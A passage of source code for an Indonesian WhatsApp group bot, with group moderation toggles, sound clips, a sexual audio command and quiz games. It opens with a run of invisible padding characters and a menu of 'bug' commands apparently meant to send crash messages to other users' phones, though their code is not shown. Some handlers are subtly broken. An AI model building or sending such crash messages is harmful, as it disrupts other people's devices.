͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
 *𝑩𝑼𝑮 𝑴𝑬𝑵𝑼🌹*
 
🐣${prefix}ʙᴜɢ1
🐣${prefix}ʙᴜɢ2
🐣${prefix}ʙᴜɢ3 <ᴊᴜᴍʟᴀʜ>
🐣${prefix}bugpc
🐣${prefix}ʙᴜɢᴘᴄ2 <ᴊᴜᴍʟᴀʜ>
🐣${prefix}ʙᴜɢᴛʀᴏʟɪ
🐣${prefix}ʙᴜɢᴛʀᴏʟɪ2 <ᴊᴜᴍʟᴀʜ>
🐣${prefix}ʙᴜghole
🐣${prefix}ʙᴜɢᴠɴ
🐣${prefix}ʙᴜɢʟᴏᴋᴀsɪ
🐣${prefix}ʙᴜɢᴄᴏᴍʙɪɴᴇ
🐣${prefix}ʙᴜɢᴋᴀᴛᴀʟᴏɢ`
              buf = imagehisnu
              Hisnu.sendMessage(from, buf, image, {quoted:ftroli, caption:menu, thumbnail:imgcel, contextInfo:{ mentionedJid: parseMention(menu), externalAdReply: {
              title: `Hai ${pushname}👋`,
              body: `${tanggal}`,
              previewType: 1,
              thumbnailUrl: "https://ibb.co/FzLx165/Menu.jpg",
              thumbnail: fs.readFileSync('./media/Menu.jpg'), }, forwardingScore: 989, isForwarded: true, mentionedJid:[tagme + "@s.whatsapp.net", anus]}})
              break
       case 'antilink':
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(`Jadiin Gw Admin Dulu🗿`)
              if (!q) return reply(`Pilih enable atau disable`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiLink) return reply(`Udah Aktif Kak`)
              antilink.push(from)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('Sukses mengaktifkan fitur antilink di group ini ✅')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('Sukses menonaktifkan fitur antilink di group ini ✅')
              } else {
              reply(`Enable untuk mengaktifkan, disable untuk menonaktifkan`)
}
              break
       case 'welcome':
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
               if (args.length < 1) return reply('!welcome enable/disable')
               if ((args[0]) === 'enable') {
               if (isWelkom) return reply('Udah Aktif kak')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses mengaktifkan fitur welcome di group ini ✅')
               } else if ((args[0]) === 'disable') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses menonaktifkan fitur welcome di group ini ✅')
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break
       case "antihidetag":
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (args[0] == "enable") {
              if (isAntihidetag) return reply("Udah aktif kak")
              antihidetg.push(from);
              fs.writeFileSync("./database/antihidetag.json", JSON.stringify(antihidetg))
              reply("Sukses mengaktifkan fitur antihidetag di group ini ✅")
              } else if (args[0] == "disable") {
              antihidetg.splice(from, 1);
              fs.writeFileSync("./database/antihidetag.json", JSON.stringify(antihidetg))
              reply("Sukses menonaktifkan fitur antihidetag di group ini ✅")
              } else {
              reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
              break
      case "antivirtex":
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
               if (!isBotGroupAdmins) return reply(`Jadiin Gw Admin Dulu🗿`)
               if (args[0] == "enable") {
               if (isAntivirtex) return reply("Udah Aktif Kak");
               antivirtex.push(from);
               fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex))
               reply("Sukses mengaktifkan fitur antihidetag di group ini ✅")
               } else if (args[0] == "disable") {
               antivirtex.splice(from, 1);
               fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant))
               reply("Sukses menonaktifkan fitur antivirtex di group ini ✅")
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break     
        case 'linkgc':
        case 'linkgrup':
        case 'linkgrop':
        case 'linkgroup':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk membuka banned nya')
               if (!isGroup) return reply(mess.only.group)
               if (!isBotGroupAdmins) return 
               linkgc = await Hisnu.groupInviteCode(from)
               yeh = `\`\`\`「 LINK GRUP 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n_Nih Bisa Lah Dishare☕_`
               Hisnu.sendMessage(from, yeh, text, { quoted: ftroli })
               break  
///-------------SOUND--------///               
       case 'sound':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound = fs.readFileSync('./mp3/sound1.mp3')
               Hisnu.sendMessage(from, sound, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break 
       case 'sound1':
               const sound1 = fs.readFileSync('./mp3/sound1.mp3')
               Hisnu.sendMessage(from, sound1, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                          
       case 'sound2':
               const sound2 = fs.readFileSync('./mp3/sound2.mp3')
               Hisnu.sendMessage(from, sound2, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break 
       case 'sound3':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound3 = fs.readFileSync('./mp3/sound3.mp3')
               Hisnu.sendMessage(from, sound3, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break 
       case 'sound4':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound4 = fs.readFileSync('./mp3/sound4.mp3')
               Hisnu.sendMessage(from, sound4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break      
        case 'sound5':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound5 = fs.readFileSync('./mp3/sound5.mp3')
               Hisnu.sendMessage(from, sound5, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break           
        case 'sound6':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound6 = fs.readFileSync('./mp3/sound6.mp3')
               Hisnu.sendMessage(from, sound6, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound7':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound7 = fs.readFileSync('./mp3/sound7.mp3')
               Hisnu.sendMessage(from, sound7, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound8':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound8 = fs.readFileSync('./mp3/sound8.mp3')
               Hisnu.sendMessage(from, sound8, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound9':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound9 = fs.readFileSync('./mp3/sound9.mp3')
               Hisnu.sendMessage(from, sound9, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound10':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound10 = fs.readFileSync('./mp3/sound10.mp3')
               Hisnu.sendMessage(from, sound10, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound11':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound11 = fs.readFileSync('./mp3/sound11.mp3')
               Hisnu.sendMessage(from, sound11, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound12':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound12 = fs.readFileSync('./mp3/sound12.mp3')
               Hisnu.sendMessage(from, sound12, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound13':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound13 = fs.readFileSync('./mp3/sound13.mp3')
               Hisnu.sendMessage(from, sound13, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound14':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound14 = fs.readFileSync('./mp3/sound14.mp3')
               Hisnu.sendMessage(from, sound14, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound15':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound15 = fs.readFileSync('./mp3/sound15.mp3')
               Hisnu.sendMessage(from, sound15, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound16':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound16 = fs.readFileSync('./mp3/sound16.mp3')
               Hisnu.sendMessage(from, sound16, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound17':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound17 = fs.readFileSync('./mp3/sound17.mp3')
               Hisnu.sendMessage(from, sound17, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound18':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound18 = fs.readFileSync('./mp3/sound18.mp3')
               Hisnu.sendMessage(from, sound18, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound19':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound19 = fs.readFileSync('./mp3/sound19.mp3')
               Hisnu.sendMessage(from, sound19, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound20':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound20 = fs.readFileSync('./mp3/sound20.mp3')
               Hisnu.sendMessage(from, sound20, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound21':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound21 = fs.readFileSync('./mp3/sound21.mp3')
               Hisnu.sendMessage(from, sound21, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound22':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound22 = fs.readFileSync('./mp3/sound22.mp3')
               Hisnu.sendMessage(from, sound22, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                
        case 'sound23':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound23 = fs.readFileSync('./mp3/sound23.mp3')
               Hisnu.sendMessage(from, sound23, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break              
        case 'sound24':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound24 = fs.readFileSync('./mp3/sound24.mp3')
               Hisnu.sendMessage(from, sound24, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                                                        
        case 'sound25':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const sound25 = fs.readFileSync('./mp3/sound25.mp3')
               Hisnu.sendMessage(from, sound25, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break
        case 'desah':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const desahan4 = fs.readFileSync('./mp3/desahan4.mp3')
               Hisnu.sendMessage(from, desahan4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
               break                             
//------------------< Game >------------------- 
        case 'limitgame': 
        case 'balance': 
               const balance = atm.checkATMuser(sender, _uang)
               if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
               textImg(`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${balance}`)
               break
         case 'gelud':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (!isGroup) return reply(mess.only.group)
               if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
               if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
               if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
					
               gelutSkuy = setGelud(`${from}`)
               gelutSkuy.status = false
               gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
               gelutSkuy.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
               starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

               Hisnu.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
               gameAdd(sender, glimit)
               break
        case 'delsesigelud':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (!isGroup) return reply(mess.only.group)
               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               reply('Berhasil Menghapus Sesi Gelud')
               } else {
               reply('Tidak ada sesi yang berlangsung')
}
               break
        case 'delsesittt':
        case 'resetgame':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (!isGroup) return reply(mess.only.group)
               if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
               ky_ttt = naa 
               reply('Sukses Mereset Game')
               break
        case 'tictactoe':
        case 'ttt':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Tag Lawan Anda! ')
              if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
              if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
              ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
              player1 = sender
              player2 = ment[0]
              angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
              id = from
              gilir = player2
              ky_ttt.push({player1,player2,id,angka,gilir})
              Hisnu.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
              gameAdd(sender, glimit)
              break
       case 'family100':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
              anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${setting.lolkey}`)
              reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
              let anoh = anu.data.result.aswer
              let rgfds = []
              for (let i of anoh){
              let fefs = i.split('/') ? i.split('/')[0] : i
              let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
              let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
              rgfds.push(axsf.toLowerCase())
}
              game.addfam(from, rgfds, gamewaktu, family100)
              gameAdd(sender, glimit)
              break
       case 'tebakanime':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebakchara?apikey=${setting.lolkey}`)
              get_result = get_result.result
              ini_image = get_result.image
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
              tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
})
              await sleep(30000)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("*Jawaban*: " + jawaban)
              delete tebakanime[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklagu':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)
              get_result = get_result.result
              ini_audio = get_result.preview
              jawaban = get_result.judul
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_audio)
              reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')
              Hisnu.sendMessage(from, ini_buffer, audio, {quoted: mek}).then(() => {
              tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
})
              await sleep(30000)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("*Jawaban*: " + jawaban)
              delete tebaklagu[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
}
              gameAdd(sender, glimit)
              break
      case 'done':
      reply('done ya silahkan menikmati fitur')
        case 'tebaktebakan':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              Hisnu.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break
       case 'kuismath':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
              ini_image = get_result.soal
              jawaban = get_result.jawaban
              ini_buffer = await getBuffer(ini_image)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
              kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
})
              await sleep(50000)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("*Jawaban*: " + jawaban)
              delete kuismath[sender.split('@')[0]]
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
}
              gameAdd(sender, glimit)
              break
       case 'tebakgambar':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`http://zekais-api.herokuapp.com/tebakgambar`)
              ini_image = get_result.soal
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
              tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
})
              await sleep(30000)
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("*Jawaban*: " + jawaban)
              delete tebakgambar[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
}
